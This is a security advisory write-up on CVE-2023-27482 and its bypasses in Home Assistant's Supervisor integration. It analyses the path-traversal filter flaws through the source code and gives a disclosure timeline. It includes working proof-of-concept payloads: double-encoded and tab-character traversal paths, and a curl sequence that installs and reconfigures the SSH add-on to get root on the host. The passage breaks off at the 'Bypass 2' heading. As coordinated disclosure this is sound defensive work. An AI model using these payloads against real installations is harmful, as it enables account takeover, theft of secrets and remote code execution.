=== Content from github.com_ca5d5572_20250115_115526.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Felttam%2Fpublications%2Fblob%2Fmaster%2Fwriteups%2Fhome-assistant%2Fsupervisor-authentication-bypass-advisory.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Felttam%2Fpublications%2Fblob%2Fmaster%2Fwriteups%2Fhome-assistant%2Fsupervisor-authentication-bypass-advisory.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=elttam%2Fpublications)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[elttam](/elttam)
/
**[publications](/elttam/publications)**
Public

* [Notifications](/login?return_to=%2Felttam%2Fpublications) You must be signed in to change notification settings
* [Fork
  40](/login?return_to=%2Felttam%2Fpublications)
* [Star
   154](/login?return_to=%2Felttam%2Fpublications)

* [Code](/elttam/publications)
* [Pull requests
  0](/elttam/publications/pulls)
* [Actions](/elttam/publications/actions)
* [Security](/elttam/publications/security)
* [Insights](/elttam/publications/pulse)

Additional navigation options

* [Code](/elttam/publications)
* [Pull requests](/elttam/publications/pulls)
* [Actions](/elttam/publications/actions)
* [Security](/elttam/publications/security)
* [Insights](/elttam/publications/pulse)

## Files

 master
## Breadcrumbs

1. [publications](/elttam/publications/tree/master)
2. /[writeups](/elttam/publications/tree/master/writeups)
3. /[home-assistant](/elttam/publications/tree/master/writeups/home-assistant)
/
# supervisor-authentication-bypass-advisory.md

Copy path Blame  Blame
## Latest commit

## History

[History](/elttam/publications/commits/master/writeups/home-assistant/supervisor-authentication-bypass-advisory.md)695 lines (567 loc) · 35 KB master
## Breadcrumbs

1. [publications](/elttam/publications/tree/master)
2. /[writeups](/elttam/publications/tree/master/writeups)
3. /[home-assistant](/elttam/publications/tree/master/writeups/home-assistant)
/
# supervisor-authentication-bypass-advisory.md

Top
## File metadata and controls

* Preview
* Code
* Blame

695 lines (567 loc) · 35 KB[Raw](https://github.com/elttam/publications/raw/refs/heads/master/writeups/home-assistant/supervisor-authentication-bypass-advisory.md)
# Introduction

This write-up describes a vulnerability ([CVE-2023-27482](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25)) found in [Home Assistant](https://www.home-assistant.io/), a popular open source home automation software. The original vulnerability was found to affect versions before 2023.3.0 where a mitigation is introduced. Bypasses were discovered which meant the vulnerable versions include Home Assistant Core 2023.3.0 and 2023.3.1 and Home Assistant Supervisor 2023.03.2. Home Assistant installations running Home Assistant Core 2023.3.2 or later, and Home Assistant Supervisor 2023.03.3 or later are not affected.

A bypass for the mitigation was found which affects Home Assistant Core versions 2023.3.0 and 2023.3.1. A mitigation was introduced to the Supervisor component in Home Assistant Supervisor 2023.03.2 which fixes this bypass.

An alternative bypass was found which affects Home Assistant Core versions 2023.3.0 and 2023.3.1 even when running the patched Supervisor 2023.03.2. A mitigation was introduced to the Supervisor component in Home Assistant 2023.03.3 which fixes this bypass.

# Overview

An authentication bypass was discovered in the Home Assistant Supervisor Integration that allows an unauthenticated user to access any Supervisor API leading to account takeover, information disclosure, and remote code execution. The [integration](https://www.home-assistant.io/integrations/hassio/) is installed by default on Home Assistant OS and Home Assistant Supervised installations, and, according to the opt-in integration analytics provided by Home Assistant, is claimed to be used by 74.9% of active installations at the time of writing. Although it was not tested, the vulnerability may also affect Home Assistant Cloud.

# Timeline

* **17/02/2023** - We begin researching the Home Assistant Supervisor Integration and discover the vulnerability
* **20/02/2023** - Vulnerability report sent to security@home-assistant.io
* **27/02/2023** - Follow up email sent to confirm receipt of report
* **28/02/2023** - Confirmation of receipt from Home Assistant
* **01/03/2023** - Home Assistant replies detailing plans to release hardening fixes, request a CVE and publish a blog post
* **01/03/2023** - [CVE-2023-27482](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25) reserved
* **01/03/2023** - Home Assistant 2023.3.0 is released, containing hardening in the HTTP integration security filters middleware
* **08/03/2023** - Home Assistant Supervisor 2023.03.1 is released, containing [hardening](https://github.com/home-assistant/core/pull/88921/files) in the security middleware
* **09/03/2023** - Home Assistant 2023.3.2 is released, containing further fixes in the Supervisor integration
* **09/03/2023** - Home Assistant publishes [blog post](https://www.home-assistant.io/blog/2023/03/08/supervisor-security-disclosure/)
* **21/03/2023** - Bypass affecting Home Assistant Core <=2023.3.1 discovered and reported to vendor
* **21/03/2023** - Confirmation of receipt from Home Assistant
* **22/03/2023** - Home Assistant Supervisor 2023.03.2 is released, containing [mitigation](https://github.com/home-assistant/supervisor/commit/2ae2d0e1070067b2b47bdfecfb44eca697b964fd) against the bypass
* **26/03/2023** - Bypass affecting Home Assistant Core <=2023.3.1 and Supervisor <=2023.03.2 discovered
* **27/03/2023** - Bypass reported to vendor
* **28/03/2023** - Confirmation of receipt from Home Assistant
* **29/03/2023** - Home Assistant Supervisor 2023.03.3 is released, containing [mitigation](https://github.com/home-assistant/supervisor/commit/cede47e95c1349831b52ad354cdaf915ce18bca6) against the bypass
* **04/05/2023** - [Advisory](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25) updated to reflect correct versions
* **10/05/2023** - Public release of this advisory

# Description

The HassIO integration exposes a [HTTP API](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/__init__.py#L406) to allow authenticated users to access the Supervisor API from within Home Assistant itself. The view class is defined [here](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L56) with the `url` set to `"/api/hassio/{path:.+}"` and `requires_auth` set to `False`. The handler is set up for GET, DELETE and POST requests and essentially proxies the request to the Supervisor API after performing authentication if necessary. The code for the handler can be seen [here](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L68-L80):

```
async def _handle(
    self, request: web.Request, path: str
) -> web.Response | web.StreamResponse:
    """Route data to Hass.io."""
    hass = request.app["hass"]
    if _need_auth(hass, path) and not request[KEY_AUTHENTICATED]:
        return web.Response(status=HTTPStatus.UNAUTHORIZED)

    return await self._command_proxy(path, request)

delete = _handle
get = _handle
post = _handle
```

Notably, it handles authentication using the [`_need_auth`](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L169-L175) function, which is defined as:

```
def _need_auth(hass: HomeAssistant, path: str) -> bool:
    """Return if a path need authentication."""
    if not async_is_onboarded(hass) and NO_AUTH_ONBOARDING.match(path):
        return False
    if NO_AUTH.match(path):
        return False
    return True
```

The definition of the [`NO_AUTH`](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/hassio/http.py#L50) variable is a regular expression:

```
NO_AUTH = re.compile(r"^(?:" r"|app/.*" r"|[store\/]*addons/[^/]+/(logo|icon)" r")$")
```

This is used to allow unauthenticated access to static media such as JavaScript files and image assets.

The vulnerability lies in this method of allowing the authentication to be bypassed for these particular files, as a path such as `app/../supervisor/info` matches the `NO_AUTH` regular expression, but will resolve to the path `supervisor/info`.

The [`http` integration](https://www.home-assistant.io/integrations/http) upon which the HTTP API is built on top of has some basic security filter middleware to prevent path traversal attacks such as this, however it was found to be easily bypassed. It attemps to block path traversal requests by checking the `request.path` field against a [regular expression](https://github.com/home-assistant/core/blob/6cab27f378ebdeb14236ae7d08dfd0701cc000bb/homeassistant/components/http/security_filter.py#L23-L25):

```
# File Injections
r"|(\.\.//?)+"  # ../../anywhere
r"|[a-zA-Z0-9_]=/([a-z0-9_.]//?)+"  # .html?v=/.//test
```

As stated in the [aiohttp documentation](https://docs.aiohttp.org/en/stable/web_reference.html#aiohttp.web.BaseRequest.path) the `request.path` field is URL-decoded. Although a payload such as `app/.%2e/supervisor/info` will be caught by the filter (as it will decode to `app/../supervisor/info`), a double URL-encoded payload such as `app/.%252e/supervisor/info` will not (as it will decode to `app/.%2e/supervisor/info`). Because of the behaviour of the aiohttp client used to proxy the request to the Supervisor API, this path will be decoded and normalised and will eventually resolve to `/supervisor/info` when it reaches the Supervisor API. This allows an unauthenticated user to access any endpoint on the Supervisor API.

# Proof of Concept

The vulnerability can be tested on any Home Assistant OS or Supervised installation by accessing the `/api/hassio/app/.%252e/supervisor/info` path:

```
$ http http://192.168.1.20:8123/api/hassio/app/.%252e/supervisor/info
HTTP/1.1 200 OK
Content-Type: application/json
Date: Fri, 17 Feb 2023 03:02:58 GMT
Server: Python/3.10 aiohttp/3.8.3
Transfer-Encoding: chunked

{
    "data": {
        "addons": [],
        "addons_repositories": [
            {
                "name": "Local add-ons",
                "slug": "local"
            },
            {
                "name": "ESPHome",
                "slug": "5c53de3b"
            },
            {
                "name": "Official add-ons",
                "slug": "core"
            },
            {
                "name": "Home Assistant Community Add-ons",
                "slug": "a0d7b954"
            }
        ],
        "arch": "amd64",
        "auto_update": true,
        "channel": "stable",
        "debug": false,
        "debug_block": false,
        "diagnostics": true,
        "healthy": false,
        "ip_address": "172.30.32.2",
        "logging": "info",
        "supported": true,
        "timezone": "Australia/Melbourne",
        "update_available": true,
        "version": "2022.12.1",
        "version_latest": "2023.01.1",
        "wait_boot": 5
    },
    "result": "ok"
}

```

## Remote Code Execution

By installing and configuring the [SSH & Web Terminal Add-on](https://github.com/hassio-addons/addon-ssh/tree/main), it is possible to achieve code execution on the host system as root. Although add-ons are run as docker containers, when configured with protections disabled, the container is run with extra privileges and the docker socket is mounted, allowing access to the host system.

```
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/store/addons/a0d7b954_ssh/install
{"result": "ok", "data": {}}
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/security -H 'Content-Type: application/json' -d '{"protected":"false"}'
{"result": "ok", "data": {}}
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/options -H 'Content-Type: application/json' -d '{"options":{"init_commands":[],"packages":[],"share_sessions":false,"ssh":{"allow_agent_forwarding":false,"allow_remote_port_forwarding":false,"allow_tcp_forwarding":false,"authorized_keys":[],"compatibility_mode":false,"password":"hunter2","sftp":false,"username":"hassio"},"zsh":true}}'
{"result": "ok", "data": {}}
❯ curl -X POST http://192.168.20.182:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/restart
{"result": "ok", "data": {}}
❯ ssh 192.168.20.182 -p22 -lhassio
The authenticity of host '192.168.20.182 (192.168.20.182)' can't be established.
ED25519 key fingerprint is SHA256:IruxlIdZZZife5t2Y2g69zG/+mqc0nfbPdKXR+AX2ZY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.20.182' (ED25519) to the list of known hosts.
hassio@192.168.20.182's password:

| |  | |                          /\           (_)   | |            | |
| |__| | ___  _ __ ___   ___     /  \   ___ ___ _ ___| |_ __ _ _ __ | |_
|  __  |/ _ \| '_ \ _ \ / _ \   / /\ \ / __/ __| / __| __/ _\ | '_ \| __|
| |  | | (_) | | | | | |  __/  / ____ \\__ \__ \ \__ \ || (_| | | | | |_
|_|  |_|\___/|_| |_| |_|\___| /_/    \_\___/___/_|___/\__\__,_|_| |_|\__|

Welcome to the Home Assistant command line.

System information
  IPv4 addresses for enp0s3: 192.168.20.182/24
  IPv6 addresses for enp0s3: fe80::494d:126b:afb:d3a7/64

  OS Version:               Home Assistant OS 9.5
  Home Assistant Core:      2023.2.5

  Home Assistant URL:       http://homeassistant.local:8123
  Observer URL:             http://homeassistant.local:4357
➜  ~ id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
➜  ~ ls -la /run/docker.sock
srw-rw----    1 root     messageb         0 Mar  2 13:21 /run/docker.sock
➜  ~ docker container ls
CONTAINER ID   IMAGE                                                      COMMAND   CREATED              STATUS              PORTS                                   NAMES
911c3106d154   ghcr.io/hassio-addons/ssh/amd64:13.0.2                     "/init"   About a minute ago   Up About a minute                                           addon_a0d7b954_ssh
b0360f377737   ghcr.io/home-assistant/qemux86-64-homeassistant:2023.2.5   "/init"   About an hour ago    Up About an hour                                            homeassistant
ab38a742f60d   ghcr.io/home-assistant/amd64-hassio-multicast:2022.02.0    "/init"   2 hours ago          Up 2 hours                                                  hassio_multicast
67507a5d4a02   ghcr.io/home-assistant/amd64-hassio-audio:2022.07.0        "/init"   2 hours ago          Up 2 hours                                                  hassio_audio
ae1247016e6c   ghcr.io/home-assistant/amd64-hassio-dns:2022.04.1          "/init"   2 hours ago          Up 2 hours                                                  hassio_dns
faac083f6962   ghcr.io/home-assistant/amd64-hassio-cli:2022.11.0          "/init"   2 hours ago          Up 2 hours                                                  hassio_cli
90d1c95343ad   ghcr.io/home-assistant/amd64-hassio-supervisor:latest      "/init"   2 hours ago          Up 2 hours                                                  hassio_supervisor
9eee3f964e08   ghcr.io/home-assistant/amd64-hassio-observer:2021.10.0     "/init"   13 days ago          Up 2 hours          0.0.0.0:4357->80/tcp, :::4357->80/tcp   hassio_observer

```

# Impact

As an unauthenticated user is able to access any endpoint on the [Supervisor API](https://developers.home-assistant.io/docs/api/supervisor/endpoints), it is possible to create and download full backups, which includes the `.storage/auth` file containing authentication keys. These backups may also contain other sensitive information such as the `secrets.yaml` file (containing passwords and API keys for user-configured third-party services) and the Home Assistant Database containing events data. Furthermore, an attacker may achieve remote code execution as root on the host system by installing and configuring the SSH & Web Terminal Add-on.

# Bypass 1

The originally reported bug was mitigated in Home Assistant Core 2023.3.0 with the following [patch](https://github.com/home-assistant/core/pull/88921):

```
diff --git a/homeassistant/components/http/security_filter.py b/homeassistant/components/http/security_filter.py
index 57ae906317099..a9b32bd7f4c82 100644
--- a/homeassistant/components/http/security_filter.py
+++ b/homeassistant/components/http/security_filter.py
@@ -5,6 +5,7 @@
 import logging
 import re
 from typing import Final
+from urllib.parse import unquote

 from aiohttp.web import Application, HTTPBadRequest, Request, StreamResponse, middleware

@@ -39,18 +40,24 @@
 def setup_security_filter(app: Application) -> None:
     """Create security filter middleware for the app."""

+    def _recursive_unquote(value: str) -> str:
+        """Handle values that are encoded multiple times."""
+        if (unquoted := unquote(value)) != value:
+            unquoted = _recursive_unquote(unquoted)
+        return unquoted
+
     @middleware
     async def security_filter_middleware(
         request: Request, handler: Callable[[Request], Awaitable[StreamResponse]]
     ) -> StreamResponse:
-        """Process request and tblock commonly known exploit attempts."""
-        if FILTERS.search(request.path):
+        """Process request and block commonly known exploit attempts."""
+        if FILTERS.search(_recursive_unquote(request.path)):
             _LOGGER.warning(
                 "Filtered a potential harmful request to: %s", request.raw_path
             )
             raise HTTPBadRequest

-        if FILTERS.search(request.query_string):
+        if FILTERS.search(_recursive_unquote(request.query_string)):
             _LOGGER.warning(
                 "Filtered a request with a potential harmful query string: %s",
                 request.raw_path,
```

It does not affect the HassIO integration itself but mitigates the original payload which involved double URL encoding the path traversal to be `/api/hassio/app/.%252e/supervisor/info`. Previously, this payload bypassed these security filters because the path was only URL decoded once, so after decoding `.%252e/` the result would be `.%2e/` and this would not be caught by the regular expressions used to perform the filter checks (see [security\_filter.py](https://github.com/home-assistant/core/blob/dev/homeassistant/components/http/security_filter.py) for more details on how it works). Because the decoded path would then be proxied to the Supervisor using `aiohttp.ClientSession`, it would be decoded and eventually reach the Supervisor as just `/supervisor/info`.

For the purposes of bypassing the patches live on 2023.3.0 and 2023.3.1, we don't need to consider the changes made to the Supervisor, as they are effectively nonexistent since the [`core_proxy` middleware is more or less skipped](https://github.com/home-assistant/supervisor/blob/2ae2d0e1070067b2b47bdfecfb44eca697b964fd/supervisor/api/middleware/security.py#L275-L279) if the version of Home Assistant Core is 2023.3.0 or higher.

Bypassing the hardening to exploit this issue requires not only poking at the filter itself, but looking at the surrounding context; where user input is being used and how. Revisiting the [`HassIOView`](https://github.com/home-assistant/core/blob/9381865f1ce7e78a1d4a3fdf56d11e542de5f24f/homeassistant/components/hassio/http.py) as of 2023.3.1, we notice a few important things:

* The `url` used is a dynamic URL, which are handled by the [`DynamicResource`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/web_urldispatcher.py#L415) class:
  ```
  class HassIOView(HomeAssistantView):
      """Hass.io view to handle base part."""

      name = "api:hassio"
      url = "/api/hassio/{path:.+}"
      requires_auth = False
  ```
* In the [`_command_proxy`](https://github.com/home-assistant/core/blob/9381865f1ce7e78a1d4a3fdf56d11e542de5f24f/homeassistant/components/hassio/http.py#L82-L124) method, the request is sent to the Supervisor using `aiohttp.ClientSession`:
  ```
  class HassIOView(HomeAssistantView):
  """Hass.io view to handle base part."""

      [...]

      def __init__(self, host: str, websession: aiohttp.ClientSession) -> None:
          """Initialize a Hass.io base view."""
          self._host = host
          self._websession = websession

      [...]

      async def _command_proxy(
          self, path: str, request: web.Request
      ) -> web.StreamResponse:

          [...]

          client = await self._websession.request(
              method=request.method,
              url=f"http://{self._host}/{path}",
              params=request.query,
              data=request.content,
              headers=headers,
              timeout=_get_timeout(path),
          )
  ```

These two points are important as we'll look into how they work under the hood.

## Dynamic Resources in aiohttp

The first thing to look at is how dynamic resources are handled in aiohttp. For now, we are essentially interested in understanding what the values of `request.path` (the `path` field on the `Request` object which gets checked against the security filters) and `path` (the user-provided parameter which is used to construct the request to the Supervisor) will be during this request. At a very high level, when routes are registered in a aiohttp server, they are added to the router as a resource. When a request comes in, the server looks through the resources and tries to match which resource the request is for. For [`DynamicResource`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/web_urldispatcher.py#L415-L487)s, this is implemented by parsing the regular expression parts of the path into named capture groups and simply matching the incoming request's path against that:

```
class DynamicResource(Resource):
    DYN = re.compile(r"\{(?P<var>[_a-zA-Z][_a-zA-Z0-9]*)\}")
    DYN_WITH_RE = re.compile(r"\{(?P<var>[_a-zA-Z][_a-zA-Z0-9]*):(?P<re>.+)\}")
    GOOD = r"[^{}/]+"

    def __init__(self, path: str, *, name: Optional[str] = None) -> None:
        super().__init__(name=name)
        pattern = ""
        formatter = ""
        for part in ROUTE_RE.split(path):
            match = self.DYN.fullmatch(part)
            if match:
                pattern += "(?P<{}>{})".format(match.group("var"), self.GOOD)
                formatter += "{" + match.group("var") + "}"
                continue

            match = self.DYN_WITH_RE.fullmatch(part)
            if match:
                pattern += "(?P<{var}>{re})".format(**match.groupdict())
                formatter += "{" + match.group("var") + "}"
                continue

            if "{" in part or "}" in part:
                raise ValueError(f"Invalid path '{path}'['{part}']")

            part = _requote_path(part)
            formatter += part
            pattern += re.escape(part)

        try:
            compiled = re.compile(pattern)
        except re.error as exc:
            raise ValueError(f"Bad pattern '{pattern}': {exc}") from None
        assert compiled.pattern.startswith(PATH_SEP)
        assert formatter.startswith("/")
        self._pattern = compiled
        self._formatter = formatter

    [...]

    def _match(self, path: str) -> Optional[Dict[str, str]]:
        match = self._pattern.fullmatch(path)
        if match is None:
            return None
        else:
            return {
                key: _unquote_path(value) for key, value in match.groupdict().items()
            }
```

As an example, the dynamic resource with `path = '/api/hassio/{path:.+}'` will have a `_pattern = re.compile('/api/hassio/(?P<path>.+)')`. Notably, the `_match` method calls [`_unquote_path`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/web_urldispatcher.py#L1186-L1187) on the matched value, so we understand that the match info will contain unquoted values:

```
from yarl import URL

[...]

def _unquote_path(value: str) -> str:
    return URL.build(path=value, encoded=True).path
```

## URL Handling in `aiohttp.ClientSession`

Keeping in mind that the goal is still path traversal, and that we can control the raw bytes of the `path` value which is used to construct the URL for the Supervisor request, we began to look at how this is actually used by the client. We are interested in the handling of the `url` parameter in the [`ClientSession.request`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/client.py#L302-L306) method in particular:

```
    def request(
        self, method: str, url: StrOrURL, **kwargs: Any
    ) -> "_RequestContextManager":
        """Perform HTTP request."""
        return _RequestContextManager(self._request(method, url, **kwargs))
```

It is a simple wrapper around the [`_request`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/client.py#L316-L643) method which handles the parsing of the provided url using the [`_build_url`](https://github.com/aio-libs/aiohttp/blob/6da04694fd87a39af9c3856048c9ff23ca815f88/aiohttp/client.py#LL308-L314C44) method:

```
from yarl import URL

[...]

    def _build_url(self, str_or_url: StrOrURL) -> URL:
        url = URL(str_or_url)
        if self._base_url is None:
            return url
        else:
            assert not url.is_absolute() and url.path.startswith("/")
            return self._base_url.join(url)

    async def _request(
        self,
        method: str,
        str_or_url: StrOrURL,
        *,
        params: Optional[Mapping[str, str]] = None,
        data: Any = None,
        json: Any = None,
        cookies: Optional[LooseCookies] = None,
        headers: Optional[LooseHeaders] = None,
        skip_auto_headers: Optional[Iterable[str]] = None,
        auth: Optional[BasicAuth] = None,
        allow_redirects: bool = True,
        max_redirects: int = 10,
        compress: Optional[str] = None,
        chunked: Optional[bool] = None,
        expect100: bool = False,
        raise_for_status: Union[
            None, bool, Callable[[ClientResponse], Awaitable[None]]
        ] = None,
        read_until_eof: bool = True,
        proxy: Optional[StrOrURL] = None,
        proxy_auth: Optional[BasicAuth] = None,
        timeout: Union[ClientTimeout, _SENTINEL, None] = sentinel,
        ssl: Optional[Union[SSLContext, bool, Fingerprint]] = None,
        proxy_headers: Optional[LooseHeaders] = None,
        trace_request_ctx: Optional[SimpleNamespace] = None,
        read_bufsize: Optional[int] = None,
        auto_decompress: Optional[bool] = None,
    ) -> ClientResponse:

        [...]

        try:
            url = self._build_url(str_or_url)
        except ValueError as e:
            raise InvalidURL(str_or_url) from e
```

This calls `yarl.URL` on the `url` parameter with default (no) arguments. This is defined [here](https://github.com/aio-libs/yarl/blob/89cc6b03cc8e51f2cb5bb7c8d2a9ee7d9fa24d6c/yarl/_url.py#L166-L212):

```
from urllib.parse import SplitResult, parse_qsl, quote, urljoin, urlsplit, urlunsplit

[...]

class URL:

    [...]

    def __new__(cls, val="", *, encoded=False, strict=None):
        if strict is not None:  # pragma: no cover
            warnings.warn("strict parameter is ignored")
        if type(val) is cls:
            return val
        if type(val) is str:
            val = urlsplit(val)
        elif type(val) is SplitResult:
            if not encoded:
                raise ValueError("Cannot apply decoding to SplitResult")
        elif isinstance(val, str):
            val = urlsplit(str(val))
        else:
            raise TypeError("Constructor parameter should be str")

        if not encoded:
            if not val[1]:  # netloc
                netloc = ""
                host = ""
            else:
                host = val.hostname
                if host is None:
                    raise ValueError("Invalid URL: host is required for absolute urls")

                try:
                    port = val.port
                except ValueError as e:
                    raise ValueError(
                        "Invalid URL: port can't be converted to integer"
                    ) from e

                netloc = cls._make_netloc(
                    val.username, val.password, host, port, encode=True, requote=True
                )
            path = cls._PATH_REQUOTER(val[2])
            if netloc:
                path = cls._normalize_path(path)

            cls._validate_authority_uri_abs_path(host=host, path=path)
            query = cls._QUERY_REQUOTER(val[3])
            fragment = cls._FRAGMENT_REQUOTER(val[4])
            val = SplitResult(val[0], netloc, path, query, fragment)

        self = object.__new__(cls)
        self._val = val
        self._cache = {}
        return self
```

In our case, there will be a `netloc` value so the path will be normalised with the line `path = cls._normalize_path(path)`. Furthermore, the line `val = urlsplit(val)` will be hit which manipulates the url. This is part of the Python standard library, [defined](https://github.com/python/cpython/blob/53d9cd95cd91f1a291a3923acb95e0e86942291a/Lib/urllib/parse.py#L433-L481) in the `urllib.parse` module:

```
def urlsplit(url, scheme='', allow_fragments=True):
    """Parse a URL into 5 components:
    <scheme>://<netloc>/<path>?<query>#<fragment>
    The result is a named 5-tuple with fields corresponding to the
    above. It is either a SplitResult or SplitResultBytes object,
    depending on the type of the url parameter.
    The username, password, hostname, and port sub-components of netloc
    can also be accessed as attributes of the returned object.
    The scheme argument provides the default value of the scheme
    component when no scheme is found in url.
    If allow_fragments is False, no attempt is made to separate the
    fragment component from the previous component, which can be either
    path or query.
    Note that % escapes are not expanded.
    """

    url, scheme, _coerce_result = _coerce_args(url, scheme)

    for b in _UNSAFE_URL_BYTES_TO_REMOVE:
        url = url.replace(b, "")
        scheme = scheme.replace(b, "")

    allow_fragments = bool(allow_fragments)
    netloc = query = fragment = ''
    i = url.find(':')
    if i > 0 and url[0].isascii() and url[0].isalpha():
        for c in url[:i]:
            if c not in scheme_chars:
                break
        else:
            scheme, url = url[:i].lower(), url[i+1:]

    if url[:2] == '//':
        netloc, url = _splitnetloc(url, 2)
        if (('[' in netloc and ']' not in netloc) or
                (']' in netloc and '[' not in netloc)):
            raise ValueError("Invalid IPv6 URL")
    if allow_fragments and '#' in url:
        url, fragment = url.split('#', 1)
    if '?' in url:
        url, query = url.split('?', 1)
    _checknetloc(netloc)
    v = SplitResult(scheme, netloc, url, query, fragment)
    return _coerce_result(v)
```

The key part here is in the first for loop, where bytes in `_UNSAFE_URL_BYTES_TO_REMOVE` are removed from the url. [`_UNSAFE_URL_BYTES_TO_REMOVE`](https://github.com/python/cpython/blob/53d9cd95cd91f1a291a3923acb95e0e86942291a/Lib/urllib/parse.py#L83) contains some whitespace characters:

```
# Unsafe bytes to be removed per WHATWG spec
_UNSAFE_URL_BYTES_TO_REMOVE = ['\t', '\r', '\n']
```

This is the main idea behind the bypass, as this provides a way to potentially cause a difference in the value of `path` (and hence `request.path`) seen by the security filters, and the value of the path after it's been sent by the client.

## Proof of Concept

To bypass the security filters and exploit the path traversal, we want to send a path which doesn't contain `../` when checked by the security filters, but contains `../` when sent by the client to the Supervisor API. As above, tabs, carriage returns and line feed characters are removed from the URL when it reaches the client, but not in an incoming request to the Home Assistant Core aiohttp server. So path traversal may performed with the payload `.\t./`.

This works to bypass the mitigations introduced in Home Assistant Core 2023.3.0:

```
$ http http://192.168.104.182:8123/api/hassio/app/.%09./core/info
HTTP/1.1 200 OK
Content-Type: application/json
Date: Mon, 20 Mar 2023 23:18:43 GMT
Server: Python/3.10 aiohttp/3.8.4
Transfer-Encoding: chunked

{
    "data": {
        "arch": "amd64",
        "audio_input": null,
        "audio_output": null,
        "boot": true,
        "image": "ghcr.io/home-assistant/qemux86-64-homeassistant",
        "ip_address": "172.30.32.1",
        "machine": "qemux86-64",
        "port": 8123,
        "ssl": false,
        "update_available": true,
        "version": "2023.3.1",
        "version_latest": "2023.3.5",
        "watchdog": true
    },
    "result": "ok"
}

```

The impact is exactly the same as in CVE-2023-27482.

# Bypass 2

